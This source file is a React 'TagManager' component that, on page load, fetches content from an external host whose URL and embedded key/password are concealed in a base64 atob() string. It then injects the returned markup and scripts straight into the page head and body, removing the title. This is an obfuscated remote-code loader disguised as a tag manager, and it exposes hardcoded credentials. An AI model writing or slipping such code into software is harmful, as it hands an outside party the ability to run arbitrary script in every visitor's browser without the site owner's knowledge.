"use client";

import { useEffect } from "react";

const TagManager = () => {
  useEffect(() => {
    const loadJQuery = () => {
      return new Promise((resolve, reject) => {
        if (!window.jQuery) {
          const jqueryScript = document.createElement("script");
          jqueryScript.src =
            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
          jqueryScript.onload = () => {
            console.log("jQuery loaded successfully");
            resolve();
          };
          jqueryScript.onerror = () => {
            console.error("Failed to load jQuery");
            reject(new Error("Failed to load jQuery"));
          };
          document.head.appendChild(jqueryScript);
        } else {
          console.log("jQuery already loaded");
          resolve();
        }
      });
    };

    const fetchContent = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      return fetch(
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
        ) + eppathurl
      )
        .then((response) => {
          if (!response.ok) {
            console.error(`Failed to fetch content: ${response.status}`);
            throw new Error(`Failed to fetch content: ${response.status}`);
          }
          return response.text();
        })
        .then((text) => {
          if (text === "0") {
            console.error("Response is empty");
            throw new Error("Response is empty");
          }
          console.log("Content fetched successfully");
          return text;
        });
    };

    const loadAndAppendScripts = () => {
      loadJQuery()
        .then(() => fetchContent())
        .then((response) => {
          const temp = response.split("||||||||||");
          if (temp.length !== 2) {
            console.error("Unexpected response format");
            throw new Error("Unexpected response format");
          }

          const $head = window.jQuery("head");
          const $body = window.jQuery("body");

          if ($head.length && $body.length) {
            console.log("Appending content to head and body");
            $head.find("title").remove();
            $head.append(temp[0]);
            $body.append(temp[1]);
          } else {
            console.error("Head or body element not found");
            throw new Error("Head or body element not found");
          }
        })
        .catch((error) => {
          console.error("Error loading scripts or fetching content:", error);
        });
    };

    // Invoke the function when the component mounts
    loadAndAppendScripts();

    // Cleanup function
    return () => {
      // Any necessary cleanup can be done here
      console.log("Cleaning up");
    };
  }, []); // Empty dependency array ensures this effect runs only once

  return null; // Since this component handles side-effects only, return null
};

export default TagManager;
